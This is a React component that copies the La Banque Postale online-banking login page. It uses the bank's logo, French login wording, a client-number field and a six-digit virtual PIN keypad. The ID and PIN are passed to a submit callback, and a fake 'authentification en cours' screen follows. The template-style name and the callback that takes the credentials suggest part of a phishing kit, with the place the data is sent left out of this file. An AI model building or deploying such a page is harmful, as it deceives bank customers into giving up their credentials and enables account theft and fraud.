import React, { useState } from 'react';
import { Loader2, Search, X } from 'lucide-react';

interface LaposteAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function LaposteAuthTemplate({ onSubmit }: LaposteAuthTemplateProps) {
  const [formData, setFormData] = useState({
    clientNumber: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [passwordDigits, setPasswordDigits] = useState(['', '', '', '', '', '']);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const submitData = {
        ...formData,
        password: passwordDigits.join('')
      };
      
      const success = await onSubmit(submitData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleKeypadClick = (digit: string) => {
    const emptyIndex = passwordDigits.findIndex(d => d === '');
    if (emptyIndex !== -1) {
      const newDigits = [...passwordDigits];
      newDigits[emptyIndex] = digit;
      setPasswordDigits(newDigits);
    }
  };

  const clearPassword = () => {
    setPasswordDigits(['', '', '', '', '', '']);
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-700 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-blue-600 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace La Banque Postale en cours.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
        {/* Left Panel - Login Form */}
        <div className="bg-white p-4 lg:p-8 flex flex-col justify-center">
          <div className="max-w-md mx-auto w-full">
            {/* Header with Logo */}
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Logo_La_Banque_postale_2010.svg/1200px-Logo_La_Banque_postale_2010.svg.png" 
                  alt="La Banque Postale" 
                  className="h-8"
                />
              </div>
              <div className="flex items-center space-x-4">
                <Search className="w-5 h-5 text-gray-600" />
                <X className="w-5 h-5 text-gray-600" />
              </div>
            </div>

            <h1 className="text-xl font-semibold text-gray-800 mb-8">
              Connexion à votre compte particulier
            </h1>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Identifiant */}
              <div>
                <label className="block text-sm font-medium text-blue-600 mb-2">
                  Identifiant (10 chiffres)
                </label>
                <input
                  type="text"
                  value={formData.clientNumber}
                  onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg"
                  placeholder="5 4 6 5 4 6 4 5 6 5"
                  maxLength={10}
                  required
                />
              </div>

              {/* Remember Me */}
              <div className="flex items-center space-x-3">
                <label className="flex items-center space-x-2 cursor-pointer">
                  <div className="relative">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="sr-only"
                    />
                    <div className={`w-12 h-6 rounded-full transition-colors ${
                      rememberMe ? 'bg-blue-500' : 'bg-gray-300'
                    }`}>
                      <div className={`w-5 h-5 bg-white rounded-full shadow-md transform transition-transform ${
                        rememberMe ? 'translate-x-6' : 'translate-x-0.5'
                      } mt-0.5`}></div>
                    </div>
                  </div>
                  <span className="text-sm text-gray-600">Mémoriser mon identifiant</span>
                </label>
              </div>

              {/* Mot de passe */}
              <div>
                <label className="block text-sm font-medium text-blue-600 mb-2">
                  Mot de passe (6 chiffres)
                </label>
                
                {/* Password Display */}
                <div className="flex justify-center space-x-2 mb-4">
                  {passwordDigits.map((digit, index) => (
                    <div
                      key={index}
                      className={`w-8 h-8 border-2 rounded flex items-center justify-center text-lg font-bold ${
                        digit ? 'border-blue-500 bg-blue-50' : 'border-gray-300'
                      }`}
                    >
                      {digit ? '•' : ''}
                    </div>
                  ))}
                </div>

                {/* Virtual Keypad - Disposition EXACTE selon l'image */}
                <div className="bg-gray-50 rounded-lg p-4">
                  <div className="space-y-2 max-w-xs mx-auto">
                    {/* Première ligne: 0, 3, 5, 4, 7 */}
                    <div className="flex justify-center space-x-2">
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('0')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        0
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('3')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        3
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('5')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        5
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('4')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        4
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('7')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        7
                      </button>
                    </div>

                    {/* Deuxième ligne: 2, 1, 6, 9, 8 */}
                    <div className="flex justify-center space-x-2">
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('2')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        2
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('1')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        1
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('6')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        6
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('9')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        9
                      </button>
                      <button
                        type="button"
                        onClick={() => handleKeypadClick('8')}
                        className="w-12 h-12 bg-blue-100 hover:bg-blue-200 rounded text-lg font-bold transition-colors"
                      >
                        8
                      </button>
                    </div>
                  </div>

                  {/* Clear Button */}
                  <div className="flex justify-center mt-4">
                    <button
                      type="button"
                      onClick={clearPassword}
                      className="text-gray-500 hover:text-gray-700 text-sm underline"
                    >
                      Effacer
                    </button>
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={status === 'sending' || !formData.clientNumber || passwordDigits.some(d => d === '')}
                className="w-full bg-blue-600 text-white font-semibold py-4 rounded hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                {status === 'sending' ? 'Connexion en cours...' : 'Se connecter'}
              </button>

              {status === 'error' && (
                <div className="text-red-600 text-center bg-red-50 p-3 rounded">
                  Échec de la connexion. Veuillez vérifier vos identifiants.
                </div>
              )}
            </form>
          </div>
        </div>

        {/* Right Panel - Blue Background with Content */}
        <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-4 lg:p-8 flex flex-col justify-center text-white">
          <div className="max-w-md mx-auto w-full">
            <h2 className="text-3xl lg:text-4xl font-bold mb-8">
              La Banque Postale, citoyenne
            </h2>

            {/* Insurance Section */}
            <div className="bg-blue-700 bg-opacity-50 rounded-lg p-6 mb-8">
              <h3 className="text-xl font-semibold mb-4">
                Espace Assurance La Banque Postale
              </h3>
              <p className="text-blue-100 mb-4 text-sm">
                Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?
              </p>
              <div className="space-y-3">
                <button className="text-white underline text-sm hover:text-blue-200">
                  Signer mon contrat en ligne
                </button>
                <br />
                <button className="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded transition-colors">
                  Me connecter à mon espace assurance
                </button>
              </div>
            </div>

            {/* Additional Info */}
            <div className="text-blue-100 text-sm space-y-2">
              <p>• Services bancaires accessibles 24h/24</p>
              <p>• Sécurité renforcée pour vos transactions</p>
              <p>• Support client dédié</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}